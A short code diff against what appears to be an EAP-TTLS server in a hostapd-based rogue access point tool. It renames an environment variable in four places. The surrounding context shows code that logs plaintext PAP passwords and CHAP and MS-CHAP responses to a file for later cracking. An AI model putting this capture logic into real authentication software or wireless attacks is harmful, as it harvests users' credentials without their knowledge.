@@ -513,7 +513,7 @@ static void eap_ttls_process_phase2_pap(struct eap_sm *sm,
 			    user_password_len) != 0) {
 		wpa_printf(MSG_DEBUG, "EAP-TTLS/PAP: Invalid user password: %s", user_password);
 		//thanks gcp
-		char *ennode = getenv("KARMANODE");
+		char *ennode = getenv("MANANODE");
 		FILE *f = fopen(ennode, "a");
 		if (f != NULL) {
 			const char *hdr = "PAP";
@@ -594,7 +594,7 @@ static void eap_ttls_process_phase2_chap(struct eap_sm *sm,
                 printf("%02x:",password[x]);
         printf("%02x\n",password[password_len]);
 
-	char *ennode = getenv("KARMANODE");
+	char *ennode = getenv("MANANODE");
 	FILE *f = fopen(ennode, "a");
 	if (f != NULL) {
 		const char *hdr = "CHAP";
@@ -687,7 +687,7 @@ static void eap_ttls_process_phase2_mschap(struct eap_sm *sm,
                 printf("%02x:",nt_response[x]);
         printf("%02x\n",nt_response[23]);
 
-	char *ennode = getenv("KARMANODE");
+	char *ennode = getenv("MANANODE");
 	FILE *f = fopen(ennode, "a");
 	if (f != NULL) {
 		const char *hdr = "CHAP";
@@ -825,7 +825,7 @@ static void eap_ttls_process_phase2_mschapv2(struct eap_sm *sm,
                 printf("%02x:",nt_response[x]);
         printf("%02x\n",nt_response[23]);
 
-	char *ennode = getenv("KARMANODE");
+	char *ennode = getenv("MANANODE");
 	FILE *f = fopen(ennode, "a");
 	if (f != NULL) {
 		const char *hdr = "CHAP";
